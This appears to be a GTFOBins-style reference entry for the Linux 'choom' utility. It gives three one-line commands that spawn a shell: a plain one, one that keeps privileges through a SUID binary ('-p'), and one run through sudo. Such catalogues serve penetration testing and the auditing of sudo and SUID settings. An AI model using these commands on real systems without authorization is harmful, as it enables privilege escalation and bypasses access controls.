---
functions:
  shell:
    - code: choom -n 0 /bin/sh
  suid:
    - code: ./choom -n 0 -- /bin/sh -p
  sudo:
    - code: sudo choom -n 0 /bin/sh
---
